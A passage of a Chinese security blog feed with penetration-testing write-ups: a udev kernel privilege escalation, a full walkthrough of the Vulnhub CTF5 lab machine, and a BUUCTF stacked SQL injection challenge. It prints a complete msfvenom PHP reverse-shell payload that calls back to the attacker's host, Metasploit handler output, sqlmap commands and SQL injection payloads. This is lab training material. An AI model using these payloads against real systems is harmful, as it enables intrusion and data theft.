src="/images/wordimage/2022/0517/mumaphp.png"></p><p>怎么找到路径呢，我们回到首页，然后如下图所示打开即可</p><p><img src="/images/wordimage/2022/0517/shell.png"></p><p>打开之后，发现就成功反弹了meterpreter如下图。</p><p><img src="/images/wordimage/2022/0517/meterpreter.png"></p><hr><h2 id="三-提权"><a href="#三-提权" class="headerlink" title="三.提权"></a>三.提权</h2><p>来到了后台，再meterpreter的地方输入<code>shell</code>来获取一个控制台，然后输入命令<code>whereis python</code>来查找靶机是否有python，发现是有的然后再输入<code>python -c &quot;import pty; pty.spawn(&#39;/bin/bah&#39;)&quot;</code>来获取一个新的binbash，如下图。</p><p><img src="/images/wordimage/2022/0517/shellok.png"></p><p>之后就可以再靶机里面找信息，查看是否有提权的可能，经过一番查找(指的是找了半小时)，发现再系统层面，系统内核是<code>2.6</code>！！！，如下图，查看命令是<code>uname -a</code>。</p><p><img src="/images/wordimage/2022/0517/2_6neihe.png"></p><h3 id="1-udev提权"><a href="#1-udev提权" class="headerlink" title="1.udev提权"></a>1.udev提权</h3><p>udev漏洞针对的是linux2.6的内核，正好靶机是这个内核，所以这里可以使用udev漏洞来进行提权，首先我们去kali搜索是否拥有这个提权文件，发现是有的，搜索命令是<code>searchsploit udev</code>,如下图。</p><p><img src="/images/wordimage/2022/0517/udev.png"></p><p>然后我们把这个文件复制到桌面，使用命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cp</span> /usr/share/exploitdb/exploits/linux/local/8478.sh ./<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们使用meterpreter来把文件上传到靶机的<code>/tmp</code>文件夹，命令是<code>upload /root/Desktop/8478.sh /tmp</code>，需要在<code>meterpreter</code>的命令行输入，如果从shell回到meterpreter的命令行只需要按<code>ctrl +c</code>即可，然后方便做下一步操作，如下图。</p><p><img src="/images/wordimage/2022/0517/tiquanfile.png"></p><p>回到靶机，cd到tmp文件夹，发现提权文件已经在里面了，我们现在只需要给文件赋予777权限，命令是<code>chmod 777 8478.sh</code></p><p>然后我们在查看一下<code>udev id</code>查看命令是<code>ps -ef |grep udev</code>，如下图，发现是568</p><p><img src="/images/wordimage/2022/0517/568.png"></p><p>之后我们执行文件的时候加上这个id即可提权，如下图提权成功，命令是<code>./8478.sh 568</code></p><p>如下图提权，成功，发现id变成了root，并且<code>$</code>变成了<code>#</code>，完成！</p><p><img src="/images/wordimage/2022/0517/idroot.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>udev提权很重要</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Vulnhub-CTF5靶机实战</title>
      <link href="/2022/05cfba13ef.html"/>
      <url>/2022/05cfba13ef.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>靶机下载地址：<a href="https://www.vulnhub.com/entry/lampsecurity-ctf5,84/">CTF5靶机下载地址</a></p><blockquote><p>KALI地址：192.168.10.73</p><p>靶机地址：192.168.10.116</p></blockquote><hr><h2 id="一-信息收集"><a href="#一-信息收集" class="headerlink" title="一.信息收集"></a>一.信息收集</h2><h3 id="1-主机发现"><a href="#1-主机发现" class="headerlink" title="1.主机发现"></a>1.主机发现</h3><p>使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">netdiscover -r <span class="token number">192.168</span>.10.73<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图发现了，靶机IP地址</p><p><img src="/images/wordimage/2022/0516/net.png"></p><hr><h3 id="2-主机扫描"><a href="#2-主机扫描" class="headerlink" title="2.主机扫描"></a>2.主机扫描</h3><p>上面发现了靶机现在需要对靶机进行一系列扫描，这里使用的是nmap工具，使用命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -A -T4 -p- <span class="token number">192.168</span>.10.116<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>扫描结果如下图，发现开放了一堆堆的端口</p><p><img src="/images/wordimage/2022/0516/nmap.png"></p><hr><h3 id="3-目录扫描"><a href="#3-目录扫描" class="headerlink" title="3.目录扫描"></a>3.目录扫描</h3><p>开放了一堆堆端口里面开放了80端口，那么久可以先来一波目录扫描，这里使用的是dirb，命令如下</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirb http://192.168.10.116<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图，扫描结果如下，发现有很多目录，红色箭头是我自己感觉重要的目录</p><p><img src="/images/wordimage/2022/0516/dirb.png"></p><hr><h3 id="4-网页信息收集"><a href="#4-网页信息收集" class="headerlink" title="4.网页信息收集"></a>4.网页信息收集</h3><p>根据上面目录扫描，其实真正有用的地方是<code>/list</code>和<code>blog</code>这个选项卡里面，比如在初步测试的时候，在list的地方出现了SQL语句报错，如下图，就只是在输入框里面输入了一个<code>&#39;</code>就报错了，极度可能有SQL注入的漏洞。</p><p><img src="/images/wordimage/2022/0516/list.png"></p><p>然后如下图，在blog里面发现了几个选项卡可能是敏感东西，而且这个CMS是<code>NanoCMS</code>。</p><p><img src="/images/wordimage/2022/0516/blog.png"></p><p>然后在网上简单查一下，这个CMS的漏洞，具体信息如下图，意思就是说有密码哈希值泄露</p><p>具体文章👉<a href="http://www.securityspace.com/smysecure/catid.html?id=1.3.6.1.4.1.25623.1.0.100141">文章</a></p><p><img src="/images/wordimage/2022/0516/CMSloudong.png"></p><p>然后我们访问<code>Webmail</code>这个选项卡，如下图，发现是一个发送邮件的程序，版本号是<code>1.4.11</code>。</p><p><img src="/images/wordimage/2022/0516/mail.png"></p><p>然后在网上查一下这个程序版本的漏洞，拥有远程命令执行的漏洞，版本影响如下，刚好靶机的版本是受到影响的版本</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">受影响的版本 Squirrelmail Version &lt;= 1.4.22不受影响的版本 Squirrelmail Version > 1.4.22<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>我们在KALI里面搜索一下，这里使用的命令是<code>searchsploit SquirrelMail</code>，如下图，发现可以有利用的exp</p><p><img src="/images/wordimage/2022/0516/EXP.png"></p><p>经过简单尝试，发现需要账户和密码，但是这里没有账户和密码，就可以先把这个邮件程序放一下。</p><hr><h2 id="二-漏洞利用"><a href="#二-漏洞利用" class="headerlink" title="二.漏洞利用"></a>二.漏洞利用</h2><h3 id="1-SQL注入"><a href="#1-SQL注入" class="headerlink" title="1.SQL注入"></a>1.SQL注入</h3><p>上面网页信息收集我们在<code>/list</code>目录发现了可能有SQL注入的漏洞，这里我们使用SQLMAP来跑跑看看，需要做的事情就是因为发现是POST发送，所以先用BP抓包，然后把抓包的东西放在文本里，然后打开SQLMAP，命令如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python sqlmap.py -r <span class="token number">1</span>.txt --dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图成功爆出数据库，但是经过一番探索查找，并没有发现数据库可以利用的东西并且使用了SQLMAP的<code>--os-shell</code>和<code>--file-write=</code>似乎也不行。</p><p><img src="/images/wordimage/2022/0516/databases.png"></p><p>这里我抓到的数据包如下</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">POST /list/ HTTP/1.1Host: 192.168.10.116User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateContent-Type: application/x-www-form-urlencodedContent-Length: 28Origin: http://192.168.10.116Connection: closeReferer: http://192.168.10.116/list/Cookie: SESS9d38cf238e215f91c57bd790d23705ee=c0p7d52t4b0kipv24jq5jpdrs1Upgrade-Insecure-Requests: 1name=1&amp;email=1&amp;phone=1&amp;org=1<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h3 id="2-CMS漏洞"><a href="#2-CMS漏洞" class="headerlink" title="2.CMS漏洞"></a>2.CMS漏洞</h3><p>上面SQL注入不行，那么就尝试一下CMS漏洞，上面信息收集发现了CMS可能出现密码哈希值泄露，我们把可能泄露的地址复制粘贴到我们的URL后面，如下图发现确实泄露了。</p><p><img src="/images/wordimage/2022/0516/hash.png"></p><p>然后我们把<code>password</code>选项的东西拿去在线解密👉<a href="https://md5decrypt.net/en/#answer">在线MD5解密</a>，如下图，发现解密出来密码是<strong>shannon</strong></p><p><img src="/images/wordimage/2022/0516/shannon.png"></p><p>所以这里我们就得到了一个账户密码就是</p><blockquote><p>账户：admin</p><p>密码：shannon</p></blockquote><p>其实这里我猜想的是ssh密码，但是失败了，后面才想到这页面上面不是有一个选项卡是后台登录地址吗，然后确实可以登录进去，用这个账户密码，如下图，成功登录！</p><p><img src="/images/wordimage/2022/0516/succlogin.png"></p><h4 id="2-1生成木马"><a href="#2-1生成木马" class="headerlink" title="2.1生成木马"></a>2.1生成木马</h4><p>之后熟悉了一下操作，发现在上面的<code>New Page</code>选项可以写入文件！！这里我们直接写入木马即可，首先打开KALI，我们使用命令如下来生成木马</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">msfvenom -p php/meterpreter/reverse_tcp <span class="token assign-left variable">LHOST</span><span class="token operator">=</span><span class="token number">192.168</span>.10.73 <span class="token assign-left variable">LPORT</span><span class="token operator">=</span><span class="token number">4444</span> -f raw<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>木马内容如下</p><pre class="line-numbers language-php" data-language="php"><code class="language-php">/*<span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token comment">/**/</span> <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'192.168.10.73'</span><span class="token punctuation">;</span> <span class="token variable">$port</span> <span class="token operator">=</span> <span class="token number">4444</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream_socket_client'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"tcp://<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$ip</span><span class="token punctuation">&#125;</span></span>:<span class="token interpolation"><span class="token punctuation">&#123;</span><span class="token variable">$port</span><span class="token punctuation">&#125;</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'fsockopen'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$f</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'socket_create'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">is_callable</span><span class="token punctuation">(</span><span class="token variable">$f</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$s</span> <span class="token operator">=</span> <span class="token variable">$f</span><span class="token punctuation">(</span><span class="token constant">AF_INET</span><span class="token punctuation">,</span> <span class="token constant">SOCK_STREAM</span><span class="token punctuation">,</span> <span class="token constant">SOL_TCP</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$res</span> <span class="token operator">=</span> @<span class="token function">socket_connect</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$port</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$res</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$s_type</span> <span class="token operator">=</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no socket funcs'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$s</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'no socket'</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unpack</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Nlen"</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$len</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'len'</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&lt;</span> <span class="token variable">$len</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">switch</span> <span class="token punctuation">(</span><span class="token variable">$s_type</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'stream'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token operator">.=</span> <span class="token function">fread</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token keyword">case</span> <span class="token string single-quoted-string">'socket'</span><span class="token punctuation">:</span> <span class="token variable">$b</span> <span class="token operator">.=</span> <span class="token function">socket_read</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">,</span> <span class="token variable">$len</span><span class="token operator">-</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">break</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token punctuation">&#125;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msgsock'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s</span><span class="token punctuation">;</span> <span class="token variable">$GLOBALS</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'msgsock_type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$s_type</span><span class="token punctuation">;</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">extension_loaded</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'suhosin'</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">ini_get</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'suhosin.executor.disable_eval'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span> <span class="token variable">$suhosin_bypass</span><span class="token operator">=</span><span class="token function">create_function</span><span class="token punctuation">(</span><span class="token string single-quoted-string">''</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token variable">$suhosin_bypass</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span> <span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">&#125;</span> <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>然后我们把生成的木马内容复制到上面的内容区域，如下图，然后我们点击添加即可。</p><p><img src="/images/wordimage/2022/0516/mumaok.png"></p><p>之后我们回到KALI，开启监听，我们开启<code>msfconsole</code>，完整操作流程如下。</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">┌──<span class="token punctuation">(</span>root㉿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/Desktop<span class="token punctuation">]</span>└─<span class="token comment"># msfconsole                                                                   </span>                                                  IIIIII    dTb.dTb        _.---._  II     <span class="token number">4</span><span class="token string">'  v  '</span>B   <span class="token builtin class-name">.</span><span class="token string">'"".'</span>/<span class="token operator">|</span><span class="token punctuation">\</span><span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">.</span><span class="token string">""</span><span class="token string">'.  II     6.     .P  :  .'</span> / <span class="token operator">|</span> <span class="token punctuation">\</span> <span class="token variable">`</span></span><span class="token builtin class-name">.</span>  <span class="token builtin class-name">:</span>  II     <span class="token string">'T;. .;P'</span>  <span class="token string">'.'</span>  /  <span class="token operator">|</span>  <span class="token punctuation">\</span>  <span class="token variable"><span class="token variable">`</span><span class="token builtin class-name">.</span><span class="token string">'  II      '</span>T<span class="token punctuation">;</span> <span class="token punctuation">;</span>P'    <span class="token variable">`</span></span><span class="token builtin class-name">.</span> /   <span class="token operator">|</span>   <span class="token punctuation">\</span> <span class="token builtin class-name">.</span><span class="token string">'IIIIII     '</span>YvP<span class="token string">'       `-.__|__.-'</span>I love shells --egypt       <span class="token operator">=</span><span class="token punctuation">[</span> metasploit v6.1.27-dev                          <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">2196</span> exploits - <span class="token number">1162</span> auxiliary - <span class="token number">400</span> post       <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">596</span> payloads - <span class="token number">45</span> encoders - <span class="token number">10</span> nops            <span class="token punctuation">]</span>+ -- --<span class="token operator">=</span><span class="token punctuation">[</span> <span class="token number">9</span> evasion                                       <span class="token punctuation">]</span>Metasploit tip: Tired of setting RHOSTS <span class="token keyword">for</span> modules? Try globally setting it with setg RHOSTS x.x.x.xmsf6 <span class="token operator">></span> use exploit/multi/handler <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Using configured payload generic/shell_reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> LHOST <span class="token number">192.168</span>.10.73LHOST <span class="token operator">=</span><span class="token operator">></span> <span class="token number">192.168</span>.10.73msf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token builtin class-name">set</span> payload php/meterpreter/reverse_tcppayload <span class="token operator">=</span><span class="token operator">></span> php/meterpreter/reverse_tcpmsf6 exploit<span class="token punctuation">(</span>multi/handler<span class="token punctuation">)</span> <span class="token operator">></span> exploit <span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on <span class="token number">192.168</span>.10.73:4444 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>然后我们回到靶机网页的主页，发现多了我们创建的选项卡。</p><p><img src="/images/wordimage/2022/0516/shell.png"></p><p>然后我们点击即可，然后就成功反弹了shell！！，如下图成功反弹</p><p><img src="/images/wordimage/2022/0516/shellsucc.png"></p><p>然后我们输入<code>shell</code>来获取终端，之后我们查找python有没有，使用命令是<code>whereis python</code>如下图，发现靶机有python</p><p><img src="/images/wordimage/2022/0516/python.png"></p><p>然后我们输入如下命令来重新获取一个终端</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">python <span class="token operator">-</span>c <span class="token string">"import pty; pty.spawn("</span><span class="token operator">/</span><span class="token builtin">bin</span><span class="token operator">/</span>bash<span class="token string">")"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><hr><h3 id="3-提权"><a href="#3-提权" class="headerlink" title="3.提权"></a>3.提权</h3><p>获取到了低权限之后就可以尝试提权了，其实到这里之后就可以尝试看各种敏感信息比如<code>/etc/passwd</code>,<code>/home</code>这些目录下的东西，还有系统版本，经过初步测试，发现没有发现什么东西，经过深层的探索之后，在<code>/home</code>目录下面有五个用户的目录，其他四个没啥东西，但是在<code>patrick</code>有大东西，在<code>patrick</code>的家目录下面，的隐藏文件，如下图，<code>Tomboy</code>差不多是一个记录笔记的东西。</p><p><img src="/images/wordimage/2022/0516/log.png"></p><p>这里我们查看log文件，如下图，发现，保存了root密码</p><p><img src="/images/wordimage/2022/0516/rootpass.png"></p><p>然后我们在查看<code>.tomboy</code>文件夹里面的东西，如下图，发现了root密码，密码是<strong>50$cent</strong></p><p><img src="/images/wordimage/2022/0516/root.png"></p><p>然后我们在这里切换到root用户试试，发现成功切换到root用户！！结束！！！</p><p><img src="/images/wordimage/2022/0516/suroot.png"></p><hr><h2 id="四-总结"><a href="#四-总结" class="headerlink" title="四.总结"></a>四.总结</h2><p>其实到提权的那个地方我还是看了那么亿点点WP，因为看HOME文件夹里面的东西太多了，感觉都没啥用，都是一眼带过，就没发现重要信息，所以这件事告诉了我们打靶场文件多起码都要认真看，23333</p>]]></content>
      
      
      <categories>
          
          <category> WEB靶场 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 靶场 </tag>
            
            <tag> Vulnhub </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-Web-[强网杯 2019]随便注</title>
      <link href="/2022/0530798ffa.html"/>
      <url>/2022/0530798ffa.html</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>刷题网址：<a href="https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8">https://buuoj.cn/challenges#[%E5%BC%BA%E7%BD%91%E6%9D%AF%202019]%E9%9A%8F%E4%BE%BF%E6%B3%A8</a></p><hr><p>首先打开就是SQL注入，我们尝试一下，如下图，发现返回的是原始数据</p><p><img src="/images/wordimage/2022/0513/injection.png"></p><p>然后我们输入<code>1&#39; or 1=1#</code>发现返回了所有数据，如下图</p><p><img src="/images/wordimage/2022/0513/or11.png"></p><p>这里我们直接来使用联合注入尝试，发现<code>order by 2</code>正常回显，但是<code>order by 3</code>就报错</p><p><img src="/images/wordimage/2022/0513/orderby2.png"></p><p>这里我们查询，发现过滤了很多关键字。</p><p><img src="/images/wordimage/2022/0513/union.png"></p><p>这里可以选择尝试堆叠注入，如下图，发现是可以进行堆叠注入的,并且把所有的数据库都爆出来了。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">payload: 1';show databases;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0513/databases.png"></p><p>然后这里我们查表，发现有两个表，一个是纯数字表一个是<code>words</code>表，如下图</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">payload: 1';show tables;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0513/twotables.png"></p><p>我们查看数字表，如下图，发现flag在里面，然后反单引号（`）是数据库、表、索引、列和别名用的引用符，但是这里经过测试，如果是纯数字的表就需要加反单引号，如果不是就不需要加或者加上也无所谓。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">payload: 1';show columns from `1919810931114514`;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0513/duidie.png"></p><p>然后我们在查看<code>words</code>表，如下图，看起来输入框里面默认查询的就是<code>words</code>表了，因为上面查询数字表的时候只有一列，查询words表的时候有两列，那么如果是这样的话猜测一下查询语句应该是: <code>select id,data from words where id =</code>。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">payload: 1';show columns from words;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/images/wordimage/2022/0513/words.png"></p><p>如果是这样，而且还没有过滤<code>rename</code>和<code>alter</code>思路就来了，就是把<code>words</code>表改成<code>words1</code>或者其他名字，然后在把数字表名改成<code>words</code>，然后在把新的<code>words</code>里面的<code>flag</code>修改成<code>id</code>，然后在结合上面的<code>1&#39; or 1=1#</code>就可以查出flag了。</p><pre class="line-numbers language-text" data-language="text"><code class="language-text">payload: 1';rename table words to words2;rename table `1919810931114514` to words;alter table words change flag id varchar(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;desc words;#<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>如下图flag</p><p><img src="/images/wordimage/2022/0513/flagdui.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> BUUCTF </tag>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Buuctf-Web-[ACTF2020 新生赛]Include</title>
      <link href="/2022/0572fb8fa6.html"/>
      <url>/2022/0572fb8fa6.html</url>
      
